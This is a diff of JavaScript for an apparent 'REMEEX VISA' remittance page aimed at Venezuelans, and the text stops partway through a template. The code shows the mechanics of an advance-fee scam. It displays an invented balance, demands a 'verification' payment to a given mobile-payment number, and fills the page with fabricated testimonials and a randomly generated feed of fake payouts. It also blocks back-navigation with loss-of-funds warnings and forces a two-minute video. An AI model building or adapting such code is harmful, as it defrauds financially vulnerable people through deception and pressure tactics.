+  const firstNames = ["Carlos", "María", "José", "Ana", "Juan", "Carmen", "Pedro", "Rosa", "Luis", "Gabriela", "Miguel", "Luisa", "Francisco", "Daniela", "Eduardo", "Patricia", "Alberto", "Verónica", "Roberto", "Josefina"];
+  const lastNames = ["Pérez", "González", "Rodríguez", "Hernández", "García", "Martínez", "López", "Sánchez", "Díaz", "Torres", "Vargas", "Rojas", "Morales", "Castro", "Ortiz", "Mendoza", "Suárez", "Ramírez", "Flores", "Jiménez"];
+  
+  // Bancos venezolanos comunes
+  const venezuelanBanks = ["Banesco", "Banco de Venezuela", "BBVA Provincial", "Mercantil", "BOD", "BNC", "Banco del Tesoro", "Bancaribe", "Bicentenario", "Venezolano de Crédito"];
+  
+  // Ciudades venezolanas comunes
+  const venezuelanCities = ["Caracas", "Maracaibo", "Valencia", "Barquisimeto", "Maracay", "Ciudad Guayana", "Barcelona", "Maturín", "Ciudad Bolívar", "Cumaná", "Mérida", "San Cristóbal", "Barinas", "Puerto La Cruz", "Punto Fijo"];
+  
+  // Montos comunes para remesas (en bolívares, asumiendo tasa 1:90.00)
+  const commonAmounts = [
+    "4.500,00 Bs", // ~$50
+    "9.000,00 Bs", // ~$100
+    "18.000,00 Bs", // ~$200
+    "27.000,00 Bs", // ~$300
+    "45.000,00 Bs", // ~$500
+    "90.000,00 Bs", // ~$1000
+    "13.500,00 Bs", // ~$150
+    "22.500,00 Bs", // ~$250
+    "36.000,00 Bs", // ~$400
+    "54.000,00 Bs"  // ~$600
+  ];
+
+  // TESTIMONIOS - 15 en total
+  const testimonialData = [
+    {
+      content: "No estoy de acuerdo con este tipo de verificación, pero bueh, no tuve de otra y lo hice y todo salió bien, fue rápido, pero si no los tenía o no me los prestan ¿qué pasa con el dinero? Deben avisar, de igual forma quedé encantada con Remeex porque tienen la tasa al dólar paralelo y no se pierde plata.",
+      name: "Carmen Quintero",
+      location: "Caracas",
+      initials: "CQ",
+      rating: 4
+    },
+    {
+      content: "Al principio me pareció raro lo de la verificación, pero luego me di cuenta que es como cuando PayPal te envía un código al banco. Todo salió como decían, me devolvieron el monto de verificación junto con mi dinero de inmediato. La tasa es muy buena.",
+      name: "Luis Martínez",
+      location: "Maracaibo",
+      initials: "LM",
+      rating: 5
+    },
+    {
+      content: "Dudé muchísimo con esto de la verificación porque pensé que me iban a estafar, pero mi primo ya lo había usado y me dijo que era confiable. Al final me decidí y todo llegó a mi cuenta en segundos. La mejor tasa que he encontrado para mis remesas.",
+      name: "Ana Torres",
+      location: "Valencia",
+      initials: "AT",
+      rating: 5
+    },
+    {
+     content: "¡Increíble servicio! No me tocó verificar con recarga porque mi firma coincidió a la primera. Recibí mi dinero en menos de un minuto a mi cuenta de Banesco. Sin duda, la mejor opción para recibir remesas en Venezuela. ¡Gracias REMEEX!",
+      name: "Jorge Castillo",
+      location: "Mérida",
+      initials: "JC",
+      rating: 5
+    },
+    {
+      content: "Mi hermana me envía dinero desde Chile y siempre usamos REMEEX. Esta vez me pidieron verificación pero fue rápido y sin problemas. Lo que más me gusta es que la tasa siempre es mejor que en cualquier otro lado. Muy recomendado.",
+      name: "Mariana Blanco",
+      location: "Barcelona",
+      initials: "MB",
+      rating: 5
+    },
+    {
+      content: "Yo no tenía para hacer la verificación, llamé al soporte y me explicaron otra forma de verificar enviando mi cédula y una selfie. Fue más lento (tardó como 2 horas) pero funcionó perfectamente. Muy buena atención al cliente.",
+      name: "Pedro Araujo",
+      location: "San Cristóbal",
+      initials: "PA",
+      rating: 4
+    },
+    {
+      content: "Primera vez usando el servicio, no sabía que había que verificar, pero entiendo que es por seguridad. Lo bueno es que apenas hice la recarga, me llegó todo completo a mi cuenta. La tasa es excelente, mucho mejor que otras páginas.",
+      name: "Daniela Ramírez",
+      location: "Barquisimeto",
+      initials: "DR",
+      rating: 5
+    },
+    {
+      content: "Recomendado 100%. Mi firma electrónica funcionó sin problemas, así que no necesité hacer recarga de verificación. El monto se depositó en mi cuenta del Banco de Venezuela en segundos. Volveré a usar el servicio sin dudarlo.",
+      name: "Carlos Medina",
+      location: "Ciudad Bolívar",
+      initials: "CM",
+      rating: 5
+    },
+    {
+      content: "Me daba miedo hacer la verificación porque pensé que era estafa, pero tenía necesidad y me arriesgué. Todo perfecto y rápido. Me devolvieron los 1.400 junto con mi remesa. La mejor tasa del mercado sin duda.",
+      name: "Andreína Pérez",
+      location: "Maracay",
+      initials: "AP",
+      rating: 5
+    },
+    {
+      content: "Mi papá desde España me envía mensual y REMEEX es nuestra opción favorita. A veces me piden verificación, otras veces no. Lo que sí es constante es la buena tasa y la rapidez. Nunca he tenido problemas en más de 8 meses usando el servicio.",
+      name: "Roberto Fuentes",
+      location: "Puerto La Cruz",
+      initials: "RF",
+      rating: 5
+    },
+    {
+      content: "No estaba segura de hacer la verificación porque estaba corta de dinero. Llamé a atención al cliente y me dijeron que podía hacer un monto menor. Funcionó perfectamente. Lo devolvieron junto con mi remesa al instante. Muy buen servicio y atención.",
+      name: "Luisa Carreño",
+      location: "Punto Fijo",
+      initials: "LC",
+      rating: 4
+    },
+    {
+      content: "Tenía mi dinero travado en otra página y un pana me recomendó REMEEX. Me pidieron verificación, la hice en 5 minutos y todo llegó perfecto. Lo mejor: la tasa. Ahora mi familia siempre me manda por aquí.",
+      name: "Santiago Mora",
+      location: "Cumaná",
+      initials: "SM",
+      rating: 5
+    },
+    {
+      content: "Me gustó que me dieron opción de verificar con firma o con recarga. Elegí la firma y funcionó sin problemas. Todo el proceso duró menos de 3 minutos. El dinero cayó rápido en mi cuenta de Mercantil. Excelente servicio, lo recomendaré.",
+      name: "Victoria Rondón",
+      location: "Maturín",
+      initials: "VR",
+      rating: 5
+    },
+    {
+      content: "Al principio no me gustó tener que hacer la verificación porque estaba apurado, pero entiendo que es por seguridad. Lo importante es que cumplieron: el dinero + la verificación llegaron completos a mi cuenta. La tasa es inmejorable.",
+      name: "Francisco Duarte",
+      location: "Barinas",
+      initials: "FD",
+      rating: 4
+    },
+    {
+      content: "Por fin una página que no roba con la tasa. Tuve que hacer verificación pero me explicaron todo por WhatsApp y fue facilísimo. Desde ese momento mi familia solo usa REMEEX para enviarme dinero desde Chile. Súper recomendado.",
+      name: "Elena Gutiérrez",
+      location: "Valencia",
+      initials: "EG",
+      rating: 5
+    }
+  ];
+
+  // Control de veces que se abre el overlay de datos:
+  let timesBlurOpened = 0;
+
+  let exchangeRate = 90.00;
+  let showingBs = true;
+
+  // Feed de actividades y testimonios
+  let currentTestimonialIndex = 0;
+  let testimonials = [];
+  let feedItems = [];
+  let scrollPosition = 0;
+  let animationFrameId = null;
+
+  // MODIFICADO: Variables para el contador del video
+  let videoTimer = null;
+  let videoSecondsLeft = 120;
+  let videoWatched = false;
+  let videoOverlayShown = false;
+
+  /****************************************************
+   * EVENTO DOMContentLoaded
+   ****************************************************/
+  document.addEventListener("DOMContentLoaded", () => {
+    // Activamos aparición suave del container
+    document.querySelector('.container').classList.add('active');
+
+    // Cargamos (si existiera) la data guardada en sessionStorage
+    loadSavedData();
+    
+    // Intentar cargar datos desde retiroremeex.html
+    loadDataFromRetiroRemeex();
+
+    // Iniciamos la tarjeta de saldo y su lógica
+    initSaldoCards();
+
+    // Configuramos listeners de botones
+    setupEventListeners();
+    
+    // Iniciar actividad en tiempo real (con scroll vertical)
+    initActivityFeed();
+    
+    // Iniciar testimonios (con desplazamiento horizontal)
+    initTestimonials();
+    
+    // Iniciar lógica de preguntas frecuentes
+    initFAQs();
+    
+    // Intentar cargar opiniones desde opiniones.html
+    loadOpinionsFromPage();
+
+    // Evitar retroceso y recarga
+    setupNavigationWarning();
+    
+    // Configurar botón de WhatsApp
+    setupWhatsAppButton();
+    
+    // MODIFICADO: Mostrar video obligatorio después de 4 segundos
+    setTimeout(showInitialVideo, 4000);
+    
+    // Compartir datos con otras páginas
+    shareDataWithOtherPages();
+  });
+
+  /****************************************************
+   * FUNCIÓN PARA COMPARTIR DATOS CON OTRAS PÁGINAS
+   ****************************************************/
+  function shareDataWithOtherPages() {
+    // Crear un objeto con todos los datos necesarios
+    const allData = {
+      saldoDisponible: saldoDisponible,
+      nombreCompleto: nombreCompleto,
+      documentoBeneficiario: documentoBeneficiario,
+      fechaNacimiento: fechaNacimiento,
+      bancoUsuario: bancoUsuario,
+      numeroCuenta: numeroCuenta,
+      tipoCuenta: tipoCuenta,
+      telefonoUsuario: telefonoUsuario,
+      logoBancoUsuario: logoBancoUsuario,
+      exchangeRate: exchangeRate,
+      // Añadir más datos según sea necesario
+    };
+    
+    // Guardar en localStorage
+    localStorage.setItem("remeexAllData", JSON.stringify(allData));
+    
+    // Guardar en sessionStorage
+    sessionStorage.setItem("remeexAllData", JSON.stringify(allData));
+    
+    // También guardar datos individuales para compatibilidad
+    localStorage.setItem("currentBalanceBS", formatNumberVE(saldoDisponible) + " Bs");
+    sessionStorage.setItem("currentBalanceBS", formatNumberVE(saldoDisponible) + " Bs");
+    localStorage.setItem("bankName", bancoUsuario);
+    sessionStorage.setItem("bankName", bancoUsuario);
+    localStorage.setItem("bankAccount", numeroCuenta);
+    sessionStorage.setItem("bankAccount", numeroCuenta);
+    localStorage.setItem("docNumber", documentoBeneficiario);
+    sessionStorage.setItem("docNumber", documentoBeneficiario);
+    localStorage.setItem("bankLogo", logoBancoUsuario);
+    sessionStorage.setItem("bankLogo", logoBancoUsuario);
+    
+    // Guardar objetos completos también
+    const datosRemeex = {
+      fullName: nombreCompleto,
+      docNumberCompleto: documentoBeneficiario,
+      birthDate: fechaNacimiento,
+      bankName: bancoUsuario,
+      bankAccount: numeroCuenta,
+      bankType: tipoCuenta,
+      userPhone: telefonoUsuario,
+      bankLogo: logoBancoUsuario,
+      saldoDisponible: formatNumberVE(saldoDisponible) + " Bs",
+      rateBolivar: exchangeRate
+    };
+    
+    localStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
+    sessionStorage.setItem("datosRemeex", JSON.stringify(datosRemeex));
+  }
+
+  /****************************************************
+   * VIDEO INSTRUCTIVO OBLIGATORIO (MODIFICADO)
+   ****************************************************/
+  function showInitialVideo() {
+    const videoOverlay = document.getElementById('videoOverlay');
+    if (!videoOverlay || videoOverlayShown) return;
+    
+    videoOverlay.style.display = 'flex';
+    videoOverlayShown = true;
+    
+    // Iniciar el video usando la API de Vimeo
+    const iframe = document.getElementById('videoPlayer');
+    if (iframe) {
+      // Si existe el player.js de Vimeo
+      if (typeof Vimeo !== 'undefined') {
+        const player = new Vimeo.Player(iframe);
+        player.play();
+      }
+    }
+    
+    startVideoCountdown();
+  }
+  
+  function startVideoCountdown() {
+    videoSecondsLeft = 120; // 2 minutos
+    const countdownEl = document.getElementById('countdownSeconds');
+    const closeBtn = document.getElementById('videoCloseBtn');
+    
+    if (countdownEl) countdownEl.textContent = videoSecondsLeft;
+    
+    videoTimer = setInterval(() => {
+      videoSecondsLeft--;
+      
+      if (countdownEl) countdownEl.textContent = videoSecondsLeft;
+      
+      if (videoSecondsLeft <= 0) {
+        clearInterval(videoTimer);
+        // Habilitar el botón de cierre
+        if (closeBtn) {
+          closeBtn.style.display = 'flex';
+          closeBtn.addEventListener('click', closeVideoOverlay);
+        }
+        videoWatched = true;
+      }
+    }, 1000);
+  }
+  
+  function closeVideoOverlay() {
+    const videoOverlay = document.getElementById('videoOverlay');
+    if (!videoOverlay) return;
+    
+    // Detener el video usando la API de Vimeo si está disponible
+    const iframe = document.getElementById('videoPlayer');
+    if (iframe && typeof Vimeo !== 'undefined') {
+      const player = new Vimeo.Player(iframe);
+      player.pause();
+    }
+    
+    videoOverlay.style.display = 'none';
+    clearInterval(videoTimer);
+  }
+
+  /****************************************************
+   * INICIALIZACIÓN DE FAQS
+   ****************************************************/
+  function initFAQs() {
+    // Añadir clase active al primer FAQ para que esté abierto por defecto
+    const firstFaq = document.querySelector('.faq-item');
+    if (firstFaq) {
+      firstFaq.classList.add('active');
+    }
+  }
+
+  function toggleFaq(element) {
+    const faqItem = element.parentElement;
+    
+    // Cerrar todas las FAQs
+    document.querySelectorAll('.faq-item').forEach(item => {
+      if (item !== faqItem) {
+        item.classList.remove('active');
+      }
+    });
+    
+    // Toggle la FAQ actual
+    faqItem.classList.toggle('active');
+  }
+
+  /****************************************************
+   * CONFIGURACIÓN DEL BOTÓN DE WHATSAPP
+   ****************************************************/
+  function setupWhatsAppButton() {
+    const whatsappBtn = document.getElementById('whatsappHelpBtn');
+    if (!whatsappBtn) return;
+    
+    whatsappBtn.addEventListener('click', function(e) {
+      e.preventDefault();
+      
+      const message = encodeURIComponent(
+        `Hola, necesito ayuda con mi verificación de cuenta en REMEEX VISA. Mi saldo es ${formatNumberVE(saldoDisponible)} Bs.`
+      );
+      
+      window.open(`https://wa.me/17373018059?text=${message}`, '_blank');
+    });
+  }
+  
+  /****************************************************
+   * Evitar retroceso y recarga con advertencia
+   ****************************************************/
+  function setupNavigationWarning() {
+    // Evitar retroceso
+    history.pushState({}, '', '');
+    window.addEventListener('popstate', function(e) {
+      e.preventDefault();
+      history.pushState({}, '', '');
+      showNavigationWarning();
+    });
+    
+    // Evitar recarga
+    window.addEventListener('beforeunload', function(e) {
+      // Solo mostrar advertencia si no se ha marcado como "permitir salir"
+      if (!sessionStorage.getItem('allowLeave')) {
+        e.preventDefault();
+        e.returnValue = "¡IMPORTANTE! Si abandonas esta página, podrías perder tus fondos. ¿Estás seguro?";
+        return e.returnValue;
+      }
+    });
+  }
+  
+  function showNavigationWarning() {
+    const navigationWarningOverlay = document.getElementById('navigationWarningOverlay');
+    if (!navigationWarningOverlay) return;
+    
+    navigationWarningOverlay.classList.add('active');
+    
+    // Configurar botones
+    const stayBtn = document.getElementById('stayOnPageNavBtn');
+    const leaveBtn = document.getElementById('leavePageBtn');
+    
+    if (stayBtn) {
+      stayBtn.onclick = function() {
+        navigationWarningOverlay.classList.remove('active');
+      };
+    }
+    
+    if (leaveBtn) {
+      leaveBtn.onclick = function() {
+        // Permitir salir
+        sessionStorage.setItem('allowLeave', 'true');
+        // Redirigir a visa.es
+        window.location.href = 'https://visa.es';
+      };
+    }
+  }
+
+  /****************************************************
+   * CARGAR DATOS DESDE RETIROREMEEX.HTML
+   ****************************************************/
+  function loadDataFromRetiroRemeex() {
+    // Intentar obtener datos desde localStorage o sessionStorage
+    const savedData = JSON.parse(
+      localStorage.getItem('remeexAllData') ||
+      sessionStorage.getItem('remeexAllData') ||
+      '{}'
+    );
+    
+    if (Object.keys(savedData).length > 0) {
+      // Si hay datos guardados, usarlos
+      if (savedData.saldoDisponible) saldoDisponible = savedData.saldoDisponible;
+      if (savedData.bancoUsuario) bancoUsuario = savedData.bancoUsuario;
+      if (savedData.numeroCuenta) numeroCuenta = savedData.numeroCuenta;
+      if (savedData.documentoBeneficiario) documentoBeneficiario = savedData.documentoBeneficiario;
+      if (savedData.nombreCompleto) nombreCompleto = savedData.nombreCompleto;
+      if (savedData.logoBancoUsuario) logoBancoUsuario = savedData.logoBancoUsuario;
+      if (savedData.exchangeRate) exchangeRate = savedData.exchangeRate;
+    } else {
+      // Valores simulados para demostración si no hay datos guardados
+      saldoDisponible = 3870.00;
+      bancoUsuario = "Banesco";
+      numeroCuenta = "0134-0375-92-0375000123";
+      documentoBeneficiario = "V-12345678";
+      nombreCompleto = "Juan Pérez";
+      logoBancoUsuario = getBankLogoURL(bancoUsuario);
+    }
+    
+    // Actualizar interfaz con estos datos
+    document.getElementById("balanceAmount").textContent = formatNumberVE(saldoDisponible) + " Bs";
+    document.getElementById("bankName").textContent = bancoUsuario;
+    document.getElementById("bankAccountNumber").textContent = "Cuenta: " + numeroCuenta;
+    
+    // También en otros lugares relevantes
+    document.getElementById("userBankName").textContent = bancoUsuario;
+    document.getElementById("conceptoPagoMovil").textContent = documentoBeneficiario;
+    document.getElementById("conceptoRecarga").textContent = documentoBeneficiario;
+    
+    // Actualizar logo del banco
+    const bankLogoImg = document.getElementById("bankLogoImg");
+    if (bankLogoImg && logoBancoUsuario) {
+      bankLogoImg.src = logoBancoUsuario;
+    }
+    
+    // Actualizar montos relacionados
+    actualizarMontosEnUI();
+  }
+
+  /****************************************************
+   * CARGAR OPINIONES DESDE OPINIONES.HTML
+   ****************************************************/
+  function loadOpinionsFromPage() {
+    // Para la demostración, usamos los datos predefinidos
+    testimonials = [...testimonialData];
+    
+    // Reiniciar carrusel con los testimonios
+    reinitTestimonials();
+  }
+  
+  function reinitTestimonials() {
+    const carousel = document.getElementById('testimonialsCarousel');
+    const controls = document.getElementById('testimonialControls');
+    
+    if (!carousel || !controls) return;
+    
+    // Limpiar contenido actual
+    carousel.innerHTML = '';
+    controls.innerHTML = '';
+    
+    // Crear slides con los testimonios
+    testimonials.forEach((testimonial, index) => {
+      const slide = document.createElement('div');
+      slide.className = 'testimonial-slide';
+      
+      // Generar estrellas
+      let starsHTML = '';
+      for (let i = 1; i <= 5; i++) {
+        if (i <= testimonial.rating) {
+          starsHTML += '<i class="fas fa-star"></i>';
+        } else {
+          starsHTML += '<i class="far fa-star"></i>';
+        }
+      }
+      
+      slide.innerHTML = `
+        <div class="testimonial-content">
+          "${testimonial.content}"
+        </div>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar">${testimonial.initials}</div>
+          <div class="testimonial-info">
+            <h4>${testimonial.name}</h4>
+            <p>${testimonial.location}</p>
+            <div class="testimonial-rating">${starsHTML}</div>
+          </div>
+        </div>
+      `;
+      
+      carousel.appendChild(slide);
+      
+      // Crear control dot
+      const dot = document.createElement('div');
+      dot.className = `testimonial-dot ${index === 0 ? 'active' : ''}`;
+      dot.addEventListener('click', () => showTestimonial(index));
+      controls.appendChild(dot);
+    });
+    
+    // Mostrar el primer testimonio
+    showTestimonial(0);
+  }
+  
+  function showTestimonial(index) {
+    const carousel = document.getElementById('testimonialsCarousel');
+    const dots = document.querySelectorAll('.testimonial-dot');
+    
+    if (!carousel) return;
+    
+    // Desplazar horizontalmente
+    carousel.style.transform = `translateX(-${index * 100}%)`;
+    
+    // Actualizar dots
+    dots.forEach((dot, i) => {
+      dot.classList.toggle('active', i === index);
+    });
+    
+    currentTestimonialIndex = index;
+  }
+
+  /****************************************************
+   * Carga de datos (MEJORADA)
+   ****************************************************/
+  function loadSavedData() {
+    // Leer sessionStorage y localStorage para máxima compatibilidad
+    const datosRemeex = JSON.parse(
+      sessionStorage.getItem('datosRemeex') || 
+      localStorage.getItem('datosRemeex') || 
+      '{}'
+    );
+
+    if (datosRemeex.fullName) nombreCompleto = datosRemeex.fullName;
+    if (datosRemeex.docNumberCompleto) {
+      documentoBeneficiario = datosRemeex.docNumberCompleto;
+    } else if (datosRemeex.docNumber) {
+      documentoBeneficiario = datosRemeex.docNumber;
+    }
+    if (datosRemeex.birthDate) fechaNacimiento = datosRemeex.birthDate;
+    if (datosRemeex.bankName) bancoUsuario = datosRemeex.bankName;
+    if (datosRemeex.bankAccount) numeroCuenta = datosRemeex.bankAccount;
+    if (datosRemeex.bankType) tipoCuenta = datosRemeex.bankType;
+    if (datosRemeex.userPhone) telefonoUsuario = datosRemeex.userPhone;
+
+    // Logo del banco - intentar diferentes fuentes
+    if (datosRemeex.bankLogo) {
+      logoBancoUsuario = datosRemeex.bankLogo;
+    } else if (sessionStorage.getItem("bankLogo")) {
+      logoBancoUsuario = sessionStorage.getItem("bankLogo");
+    } else if (localStorage.getItem("bankLogo")) {
+      logoBancoUsuario = localStorage.getItem("bankLogo");
+    } else {
+      logoBancoUsuario = getBankLogoURL(bancoUsuario);
+    }
+
+    // Actualizar logo del banco
+    const bankLogoImg = document.getElementById("bankLogoImg");
+    if (bankLogoImg && logoBancoUsuario) {
+      bankLogoImg.src = logoBancoUsuario;
+    }
+
+    // Saldo en Bs - buscar en múltiples fuentes y formatos
+    let saldoData = sessionStorage.getItem("currentBalanceBS") || 
+                    localStorage.getItem("currentBalanceBS") || 
+                    "0,00 Bs";
+    
+    // Intenta obtener también del objeto datosRemeex
+    if (datosRemeex.saldoDisponible) {
+      saldoData = datosRemeex.saldoDisponible;
+    }
+    
+    // Convertir a número flotante, manejando varios formatos posibles
+    saldoDisponible = parseFloat(
+      saldoData
+        .toString().replace(/\./g, '')
+        .replace(',', '.')
+        .replace(/[^\d.]/g, '')
+    ) || 0;
+
+    // Si no hay saldo, usar un valor por defecto
+    if (saldoDisponible <= 0) {
+      saldoDisponible = 1800.00; // Valor por defecto
+    }
+
+    // Actualizar en la UI
+    document.getElementById("balanceAmount").textContent = formatNumberVE(saldoDisponible) + " Bs";
+    
+    // Actualizar nombre del banco
+    if (bancoUsuario) {
+      document.getElementById("bankName").textContent = bancoUsuario;
+      document.getElementById("userBankName").textContent = bancoUsuario;
+    }
+    
+    // Actualizar número de cuenta
+    if (numeroCuenta) {
+      document.getElementById("bankAccountNumber").textContent = "Cuenta: " + numeroCuenta;
+    }
+
+    // Obtener tasa de cambio de datosRemeex
+    if (datosRemeex.rateBolivar) {
+      exchangeRate = parseFloat(datosRemeex.rateBolivar);
+      document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
+    } else {
+      // Por defecto, usar 90.00
+      exchangeRate = 90.00;
+      document.getElementById("exchangeRateText").textContent = `Tasa: ${exchangeRate.toFixed(2)}`;
+    }
+
+    // NUEVA LÓGICA PARA CALCULAR EL MONTO DE RECARGA Y ACTUALIZAR TODA LA UI
+    actualizarMontosEnUI();
+    actualizarTextosCorchetes();
+    
+    // Compartir datos con otras páginas
+    shareDataWithOtherPages();
+  }
+
+  // Calcular valores dinámicos a partir de la contraseña
+  function calcularMontoRecarga() {
+    // Para la demostración, usamos un valor fijo
+    const tasaCambio = exchangeRate;
+    const montoMinimo = 37.40; // $37.40 USD
+
+    // Calcular el monto de recarga en bolívares
+    const montoRecargaBs = Math.round(montoMinimo * tasaCambio * 100) / 100;
+    return {
+      montoMinimo: montoMinimo,
+      tasaCambio: tasaCambio,
+      montoRecargaBs: montoRecargaBs
+    };
+  }
+
+  // Actualizar todos los elementos con el monto correcto
+  function actualizarMontosEnUI() {
+    const { montoMinimo, tasaCambio, montoRecargaBs } = calcularMontoRecarga();
+    const montoFormateado = formatNumberVE(montoRecargaBs);
+    
+    // Actualizar todos los elementos que muestran el monto de recarga
+    const elementosMontoRecarga = [
+      "verificacionMonto", 
+      "verificationAmount",
+      "verificationAmountDisplay",
+      "acceptanceAmount",
+      "confirmationAmount"
+    ];
+    
+    elementosMontoRecarga.forEach(id => {
+      const elemento = document.getElementById(id);
+      if (elemento) {
+        if (id === "verificacionMonto") {
+          elemento.textContent = `${montoFormateado} Bolívares`;
+        } else if (id === "verificationAmount" || id === "verificationAmountDisplay" || id === "acceptanceAmount" || id === "confirmationAmount") {
+          elemento.textContent = `Bs. ${montoFormateado}`;
+        }
+      }
+    });
+    
+    // Actualizar el monto total del depósito
+    const montoDepositoTotal = document.getElementById("montoDepositoTotal");
+    if (montoDepositoTotal && saldoDisponible > 0) {
+      const total = saldoDisponible + montoRecargaBs;
+      montoDepositoTotal.textContent = `${formatNumberVE(total)} Bs`;
+    }
+    
+    // Actualizar saldo requerido
+    const montoRetiroBs = document.getElementById("montoRetiroBs");
+    if (montoRetiroBs) {
+      montoRetiroBs.textContent = `${formatNumberVE(saldoDisponible)} Bs`;
+    }
+  }
+
+  // Actualizar textos entre corchetes
+  function actualizarTextosCorchetes() {
+    // Nombres de banco
+    document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
+      span.textContent = bancoUsuario || "Banco";
+    });
+    
+    document.querySelectorAll(".nombreBancoRecarga").forEach(span => {
+      span.textContent = bancoUsuario || "Banco";
+    });
+    
+    // Conceptos de pago
+    const documentoBeneficiarioTexto = documentoBeneficiario || "V-12345678";
+    const conceptoElements = ["conceptoRecarga", "conceptoPagoMovil"];
+    conceptoElements.forEach(id => {
+      const elemento = document.getElementById(id);
+      if (elemento) {
+        elemento.textContent = documentoBeneficiarioTexto;
+      }
+    });
+    
+    // Verificación de recarga
+    const verificacionNumero = document.getElementById("verificacionNumero");
+    if (verificacionNumero) verificacionNumero.textContent = "0412-1000000";
+    
+    const verificacionRif = document.getElementById("verificacionRif");
+    if (verificacionRif) verificacionRif.textContent = "J-407502646";
+  }
+
+  /****************************************************
+   * Lógica de las tarjetas de saldo REMEEX y Banco
+   ****************************************************/
+  function initSaldoCards() {
+    // Actualizar mensaje dinámico de REMEEX cada 5 segundos
+    setInterval(updateRemeexDynamicMessage, 5000);
+    
+    // Actualizar mensaje dinámico del Banco cada 7 segundos
+    setInterval(updateBankDynamicMessage, 7000);
+
+    // Alternar entre Bs y USD cada 15 segundos
+    setInterval(toggleCurrency, 15000);
+  }
+
+  function toggleCurrency() {
+    const balanceAmount = document.getElementById("balanceAmount");
+    if (!balanceAmount) return;
+
+    if (showingBs) {
+      // A USD
+      const usdVal = saldoDisponible / exchangeRate;
+      balanceAmount.textContent = usdVal.toLocaleString("en-US", {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2,
+      }) + " USD";
+    } else {
+      // A Bs
+      balanceAmount.textContent = formatNumberVE(saldoDisponible) + " Bs";
+    }
+    showingBs = !showingBs;
+  }
+
+  function updateRemeexDynamicMessage() {
+    const dynamicText = document.getElementById("dynamicText");
+    if (!dynamicText) return;
+
+    const randomIndex = Math.floor(Math.random() * allMessages.length);
+    dynamicText.style.opacity = '0';
+    setTimeout(() => {
+      dynamicText.innerHTML = `<span>${allMessages[randomIndex]}</span><span class="dot-loader"></span>`;
+      dynamicText.style.opacity = '1';
+    }, 500);
+  }
+  
+  function updateBankDynamicMessage() {
+    const bankDynamicText = document.getElementById("bankDynamicText");
+    if (!bankDynamicText) return;
+
+    const randomIndex = Math.floor(Math.random() * bankMessages.length);
+    bankDynamicText.style.opacity = '0';
+    setTimeout(() => {
+      bankDynamicText.innerHTML = `<span>${bankMessages[randomIndex]}</span><span class="dot-loader"></span>`;
+      bankDynamicText.style.opacity = '1';
+    }, 500);
+  }
+
+  /****************************************************
+   * FEED DE ACTIVIDAD EN TIEMPO REAL (SCROLL VERTICAL MEJORADO)
+   ****************************************************/
+  function initActivityFeed() {
+    const feedItemsContainer = document.getElementById('feedItems');
+    if (!feedItemsContainer) return;
+    
+    // Generar feed inicial con elementos
+    for (let i = 0; i < 10; i++) {
+      addRandomActivity(feedItemsContainer);
+    }
+    
+    // Función para manual scroll de elementos (corregido para que funcione mejor)
+    function manualScrollFeed() {
+      if (feedItems.length === 0) return;
+      
+      // Cada 4 segundos, cambiamos un elemento
+      setInterval(() => {
+        if (feedItems.length > 0 && feedItemsContainer) {
+          // Eliminar el primer elemento
+          if (feedItemsContainer.firstChild) {
+            feedItemsContainer.removeChild(feedItemsContainer.firstChild);
+          }
+          
+          // Agregar un nuevo elemento al final
+          addRandomActivity(feedItemsContainer);
+        }
+      }, 4000);
+    }
+    
+    // Iniciar scroll manual en lugar de animación
+    manualScrollFeed();
+    
+    // Guardar referencia a los elementos
+    feedItems = Array.from(feedItemsContainer.children);
+    
+    // Agregar nueva actividad cada 4-8 segundos
+    setInterval(() => {
+      // Limitar a 15 elementos para optimizar rendimiento
+      while (feedItems.length > 15 && feedItemsContainer.firstChild) {
+        feedItemsContainer.removeChild(feedItemsContainer.firstChild);
+      }
+      
+      // Agregar nueva actividad
+      addRandomActivity(feedItemsContainer);
+      
+      // Actualizar array de feedItems
+      feedItems = Array.from(feedItemsContainer.children);
+    }, Math.random() * 4000 + 4000);
+  }
+  
+  function addRandomActivity(feedContainer) {
+    // Generar datos aleatorios
+    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
+    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
+    const fullName = `${firstName} ${lastName}`;
+    const initials = firstName.charAt(0) + lastName.charAt(0);
+    
+    const city = venezuelanCities[Math.floor(Math.random() * venezuelanCities.length)];
+    const bank = venezuelanBanks[Math.floor(Math.random() * venezuelanBanks.length)];
+    const amount = commonAmounts[Math.floor(Math.random() * commonAmounts.length)];
+    
+    // Crear elemento
+    const feedItem = document.createElement('div');
+    feedItem.className = 'feed-item';
+    
+    // Calcular tiempo aleatorio (entre 1 segundo y 4 minutos atrás)
+    const timeAgo = Math.floor(Math.random() * 240) + 1;
+    let timeText;
+    
+    if (timeAgo < 60) {
+      timeText = `Hace ${timeAgo}s`;
+    } else {
+      const minutes = Math.floor(timeAgo / 60);
+      timeText = `Hace ${minutes}m`;
+    }
+    
+    feedItem.innerHTML = `
+      <div class="feed-avatar">${initials}</div>
+      <div class="feed-content">
+        <span class="feed-name">${firstName}</span> recibió <span class="feed-amount">${amount}</span> en su cuenta de ${bank} (${city})
+      </div>
+      <div class="feed-time">${timeText}</div>
+    `;
+    
+    // Agregar elemento al feed
+    feedContainer.appendChild(feedItem);
+    
+    // Actualizar array de feedItems si existe
+    if (typeof feedItems !== 'undefined') {
+      feedItems = Array.from(feedContainer.children);
+    }
+  }
+
+  /****************************************************
+   * TESTIMONIOS CARRUSEL CON DESPLAZAMIENTO HORIZONTAL
+   ****************************************************/
+  function initTestimonials() {
+    testimonials = [...testimonialData]; // Copiar los datos
+    
+    const carousel = document.getElementById('testimonialsCarousel');
+    const controls = document.getElementById('testimonialControls');
+    
+    if (!carousel || !controls) return;
+    
+    // Crear slides
+    testimonials.forEach((testimonial, index) => {
+      const slide = document.createElement('div');
+      slide.className = 'testimonial-slide';
+      
+      // Generar estrellas
+      let starsHTML = '';
+      for (let i = 1; i <= 5; i++) {
+        if (i <= testimonial.rating) {
+          starsHTML += '<i class="fas fa-star"></i>';
+        } else {
+          starsHTML += '<i class="far fa-star"></i>';
+        }
+      }
+      
+      slide.innerHTML = `
+        <div class="testimonial-content">
+          "${testimonial.content}"
+        </div>
+        <div class="testimonial-author">
